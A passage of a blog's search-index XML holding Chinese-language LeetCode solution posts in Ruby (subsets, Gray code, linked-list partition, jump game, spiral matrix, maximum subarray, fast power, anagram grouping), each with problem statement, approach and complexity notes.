title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n!)</code></li><li>空间复杂度：<code>O(n!)</code></li></ul><h2 id="90-Subsets-II"><a href="#90-Subsets-II" class="headerlink" title="90. Subsets II"></a>90. Subsets II</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a collection of integers that might contain duplicates, nums, return all possible subsets (the power set).</p><p>Note: The solution set must not contain duplicate subsets.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,2]</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [2],</span><br><span class="line">  [1],</span><br><span class="line">  [1,2,2],</span><br><span class="line">  [2,2],</span><br><span class="line">  [1,2],</span><br><span class="line">  []</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>这道题和<a href="https://leetcode.com/problems/subsets/description/" target="_blank" rel="noopener">Subsets</a>的区别在于去掉重复元素，最直接的办法就是在添加一种新组合前，判断一下是否已经含有这种组合。但是，这种做法增加了时间复杂度，LeetCode上的运行时间是<code>100ms</code>。</p><p>还有一种更有效的办法，在把元素添加到组合中，直接跳过重复元素。这种做法可以把时间缩短到<code>40ms</code>。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subsets_with_dup</span><span class="params">(nums)</span></span></span><br><span class="line">  nums.sort!</span><br><span class="line">  path, result = [], []</span><br><span class="line">  _subsets(nums, <span class="number">0</span>, path, result)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _subsets<span class="params">(nums, index, path, result)</span></span></span><br><span class="line">  result.push(path.dup)</span><br><span class="line">  i = index</span><br><span class="line">  <span class="keyword">while</span> i &lt; nums.length</span><br><span class="line">    path.push(nums[i]);</span><br><span class="line">    _subsets(nums, i + <span class="number">1</span>, path, result)</span><br><span class="line">    path.pop</span><br><span class="line">    i += <span class="number">1</span> <span class="keyword">while</span> i &lt; nums.length - <span class="number">1</span> <span class="keyword">and</span> nums[i] == nums[i + <span class="number">1</span>]</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(n!)</code></li><li>空间复杂度：<code>O(n!)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Gray Code</title>
      <link href="/2018/04/23/Gray-Code/"/>
      <url>/2018/04/23/Gray-Code/</url>
      <content type="html"><![CDATA[<h1 id="89-Gray-Code"><a href="#89-Gray-Code" class="headerlink" title="89. Gray Code"></a>89. Gray Code</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>The gray code is a binary numeral system where two successive values differ in only one bit.</p><p>Given a non-negative integer n representing the total number of bits in the code, print the sequence of gray code. A gray code sequence must begin with 0.</p><p>For example, given n = 2, return [0,1,3,2]. Its gray code sequence is:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 - 0</span><br><span class="line">01 - 1</span><br><span class="line">11 - 3</span><br><span class="line">10 - 2</span><br></pre></td></tr></table></figure></p><p>Note:<br>For a given n, a gray code sequence is not uniquely defined.</p><p>For example, [0,2,3,1] is also a valid gray code sequence according to the above definition.</p><p>For now, the judge is able to judge based on one instance of gray code sequence. Sorry about that.</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>题目让生成格雷码，要生成n的格雷码，总共有2的n次方个，第i个生成方式是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(i &gt;&gt; 1) ^ i</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gray_code</span><span class="params">(n)</span></span></span><br><span class="line">  i, total, result = <span class="number">0</span>, <span class="number">1</span> &lt;&lt; n, []</span><br><span class="line">  total.times.each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    result.push((i <span class="meta">&gt;&gt; </span><span class="number">1</span>) ^ i)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(2^n)</code></li><li>空间复杂度：<code>O(2^n)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Partition List</title>
      <link href="/2018/04/20/Partition-List/"/>
      <url>/2018/04/20/Partition-List/</url>
      <content type="html"><![CDATA[<h1 id="86-Partition-List"><a href="#86-Partition-List" class="headerlink" title="86. Partition List"></a>86. Partition List</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a linked list and a value x, partition it such that all nodes less than x come before nodes greater than or equal to x.</p><p>You should preserve the original relative order of the nodes in each of the two partitions.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3</span><br><span class="line">Output: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>方法就是从头到尾遍历链表，把小于给定值的节点从当前链表摘除，添加到新链表中。然后把链表添加到新链表尾部即可。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :next</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@next</span> = nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; head</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;ListNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partition</span><span class="params">(head, x)</span></span></span><br><span class="line">  dummy = ListNode.new(<span class="number">0</span>)</span><br><span class="line">  new_dummy = ListNode.new(<span class="number">0</span>)</span><br><span class="line">  dummy.<span class="keyword">next</span> = head</span><br><span class="line">  cur, new_cur = dummy, new_dummy</span><br><span class="line">  <span class="keyword">while</span> cur.<span class="keyword">next</span></span><br><span class="line">    <span class="keyword">if</span> cur.<span class="keyword">next</span>.val &lt; x</span><br><span class="line">      new_cur.<span class="keyword">next</span> = cur.<span class="keyword">next</span></span><br><span class="line">      new_cur = new_cur.<span class="keyword">next</span></span><br><span class="line">      cur.<span class="keyword">next</span> = cur.<span class="keyword">next</span>.<span class="keyword">next</span></span><br><span class="line">      new_cur.<span class="keyword">next</span> = <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      cur = cur.<span class="keyword">next</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  new_cur.<span class="keyword">next</span> = dummy.<span class="keyword">next</span></span><br><span class="line">  <span class="keyword">return</span> new_dummy.<span class="keyword">next</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Jump Game</title>
      <link href="/2018/03/27/Jump-Game/"/>
      <url>/2018/03/27/Jump-Game/</url>
      <content type="html"><![CDATA[<h1 id="55-Jump-Game"><a href="#55-Jump-Game" class="headerlink" title="55. Jump Game"></a>55. Jump Game</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an array of non-negative integers, you are initially positioned at the first index of the array.</p><p>Each element in the array represents your maximum jump length at that position.</p><p>Determine if you are able to reach the last index.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,3,1,1,4]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: Jump 1 step from index 0 to 1, then 3 steps to the last index.</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,2,1,0,4]</span><br><span class="line">Output: false</span><br><span class="line">Explanation: You will always arrive at index 3 no matter what. Its maximum</span><br><span class="line">             jump length is 0, which makes it impossible to reach the last index.</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>假设，我们能到达终点，那我们就找前一步如何到达这里，这样一直往前走，看看能不能到达起点。总结成公式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current_position + nums[current_position] &gt;= left_most_good_index</span><br></pre></td></tr></table></figure></p><p>利用这个公式，从右往左一直找，看看能不能找回起点。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Boolean&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">can_jump</span><span class="params">(nums)</span></span></span><br><span class="line">  last = nums.length - <span class="number">1</span></span><br><span class="line">  i = nums.length - <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> i &gt;= <span class="number">0</span></span><br><span class="line">    last = i <span class="keyword">if</span> i + nums[i] &gt;= last</span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  last == <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Spiral Matrix</title>
      <link href="/2018/03/26/Spiral-Matrix/"/>
      <url>/2018/03/26/Spiral-Matrix/</url>
      <content type="html"><![CDATA[<h1 id="Spiral-Matrix"><a href="#Spiral-Matrix" class="headerlink" title="Spiral Matrix"></a>Spiral Matrix</h1><h2 id="54-Spiral-Matrix"><a href="#54-Spiral-Matrix" class="headerlink" title="54. Spiral Matrix"></a>54. Spiral Matrix</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given a matrix of m x n elements (m rows, n columns), return all elements of the matrix in spiral order.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line"> [ 1, 2, 3 ],</span><br><span class="line"> [ 4, 5, 6 ],</span><br><span class="line"> [ 7, 8, 9 ]</span><br><span class="line">]</span><br><span class="line">Output: [1,2,3,6,9,8,7,4,5]</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  [1, 2, 3, 4],</span><br><span class="line">  [5, 6, 7, 8],</span><br><span class="line">  [9,10,11,12]</span><br><span class="line">]</span><br><span class="line">Output: [1,2,3,4,8,12,11,10,9,5,6,7]</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><ul><li>先取矩阵第一行</li><li>把矩阵转置，在逆序</li><li>重复第一步，知道矩阵为空</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[][]&#125; matrix</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spiral_order</span><span class="params">(matrix)</span></span></span><br><span class="line">  result = []</span><br><span class="line">  <span class="keyword">while</span> matrix.size &gt; <span class="number">0</span></span><br><span class="line">    result.concat matrix.shift</span><br><span class="line">    matrix = matrix.transpose.reverse</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(N^3)</code></li><li>空间复杂度：<code>O(N^2)</code></li></ul><h2 id="59-Spiral-Matrix-II"><a href="#59-Spiral-Matrix-II" class="headerlink" title="59. Spiral Matrix II"></a>59. Spiral Matrix II</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a positive integer n, generate a square matrix filled with elements from 1 to n2 in spiral order.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line"> [ 1, 2, 3 ],</span><br><span class="line"> [ 8, 9, 4 ],</span><br><span class="line"> [ 7, 6, 5 ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>先把数列生成，然后以螺旋的方式填入矩阵，控制好在矩阵中移动指针的方向即可。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_matrix</span><span class="params">(n)</span></span></span><br><span class="line">  <span class="keyword">return</span> [ [ <span class="number">1</span> ] ] <span class="keyword">if</span> n == <span class="number">1</span></span><br><span class="line">  matrix = Array.new(n)&#123; Array.new(n, <span class="number">0</span>) &#125;</span><br><span class="line">  seen = Array.new(n)&#123; Array.new(n, <span class="literal">false</span>) &#125;</span><br><span class="line">  dr = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>]</span><br><span class="line">  dc = [<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">  r = c = di = <span class="number">0</span></span><br><span class="line">  (n * n).times.each <span class="keyword">do</span> <span class="params">| i |</span></span><br><span class="line">    matrix[r][c] = i + <span class="number">1</span></span><br><span class="line">    seen[r][c] = <span class="literal">true</span></span><br><span class="line">    cr, cc = r + dr[di], c + dc[di]</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= cr <span class="keyword">and</span> cr &lt; n <span class="keyword">and</span> <span class="number">0</span> &lt;= cc <span class="keyword">and</span> cc &lt; n <span class="keyword">and</span> <span class="keyword">not</span> seen[cr][cc]</span><br><span class="line">      r, c = cr, cc</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      di = (di + <span class="number">1</span>) % <span class="number">4</span></span><br><span class="line">      r, c = r + dr[di], c + dc[di]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> matrix</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(N^2)</code>，N为提供的数字大小</li><li>空间复杂度：<code>O(N^2)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Maximum Subarray</title>
      <link href="/2018/03/25/Maximum-Subarray/"/>
      <url>/2018/03/25/Maximum-Subarray/</url>
      <content type="html"><![CDATA[<h1 id="53-Maximum-Subarray"><a href="#53-Maximum-Subarray" class="headerlink" title="53. Maximum Subarray"></a>53. Maximum Subarray</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an integer array nums, find the contiguous subarray (containing at least one number) which has the largest sum and return its sum.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [-2,1,-3,4,-1,2,1,-5,4],</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: [4,-1,2,1] has the largest sum = 6.</span><br></pre></td></tr></table></figure></p><p>Follow up:<br>If you have figured out the O(n) solution, try coding another solution using the divide and conquer approach, which is more subtle.</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>把局部最优都求出来，然后从这些解中找最大值。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">max_sub_array</span><span class="params">(nums)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> nums.<span class="literal">nil</span>? <span class="keyword">or</span> nums.length == <span class="number">0</span></span><br><span class="line">  local, global = nums[<span class="number">0</span>], nums[<span class="number">0</span>]  </span><br><span class="line">  i = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; nums.length</span><br><span class="line">    local = nums[i] &gt; local + nums[i] ? nums[i] : local + nums[i]</span><br><span class="line">    global = local &gt; global ? local : global</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> global</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pow(x, n)</title>
      <link href="/2018/03/24/Pow-x-n/"/>
      <url>/2018/03/24/Pow-x-n/</url>
      <content type="html"><![CDATA[<h1 id="50-Pow-x-n"><a href="#50-Pow-x-n" class="headerlink" title="50. Pow(x, n)"></a>50. Pow(x, n)</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Implement pow(x, n), which calculates x raised to the power n (xn).</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 2.00000, 10</span><br><span class="line">Output: 1024.00000</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 2.10000, 3</span><br><span class="line">Output: 9.26100</span><br></pre></td></tr></table></figure></p><p>Example 3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 2.00000, -2</span><br><span class="line">Output: 0.25000</span><br><span class="line">Explanation: 2-2 = 1/22 = 1/4 = 0.25</span><br></pre></td></tr></table></figure></p><p>Note:</p><ul><li>-100.0 &lt; x &lt; 100.0</li><li>n is a 32-bit signed integer, within the range [−231, 231 − 1]</li></ul><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>实现指数运算函数，把指数分解成二进制表示。举例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5 = 2^2 + 1</span><br><span class="line">x^5 = x^4 * x</span><br></pre></td></tr></table></figure></p><p>这样就简化了运算，x^2、x^4等中间结果可以重复利用。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Float&#125; x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Float&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_pow</span><span class="params">(x, n)</span></span></span><br><span class="line">  res = <span class="number">1.0</span></span><br><span class="line">  i = n.abs</span><br><span class="line">  <span class="keyword">while</span> i != <span class="number">0</span></span><br><span class="line">    res *= x <span class="keyword">if</span> (i % <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">    x *= x</span><br><span class="line">    i /= <span class="number">2</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> n &lt; <span class="number">0</span> ? <span class="number">1</span> / res : res</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Group Anagrams</title>
      <link href="/2018/03/23/Group-Anagrams/"/>
      <url>/2018/03/23/Group-Anagrams/</url>
      <content type="html"><![CDATA[<h1 id="49-Group-Anagrams"><a href="#49-Group-Anagrams" class="headerlink" title="49. Group Anagrams"></a>49. Group Anagrams</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an array of strings, group anagrams together.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: [&quot;eat&quot;, &quot;tea&quot;, &quot;tan&quot;, &quot;ate&quot;, &quot;nat&quot;, &quot;bat&quot;],</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [&quot;ate&quot;,&quot;eat&quot;,&quot;tea&quot;],</span><br><span class="line">  [&quot;nat&quot;,&quot;tan&quot;],</span><br><span class="line">  [&quot;bat&quot;]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>Note:</p><ul><li>All inputs will be in lowercase.</li><li>The order of your output does not matter.</li></ul><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>用Hash来存结果，把字符串排序后的值作为key，这样就把字母相同顺序不同的字符串全都放在一起。<br>最后返回values数据即可。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String[]&#125; strs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;String[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">group_anagrams</span><span class="params">(strs)</span></span></span><br><span class="line">  result = Hash.new</span><br><span class="line">  strs.each <span class="keyword">do</span> <span class="params">|str|</span></span><br><span class="line">    index = str.chars.sort.join</span><br><span class="line">    <span class="keyword">if</span> result.has_key?(index)</span><br><span class="line">      result[index] &lt;&lt; str</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result[index] = [str]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  result.values</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N)</code></li><li>空间复杂度：<code>O(N)</code></li></ul>]]></content>
      
      <categories>
          
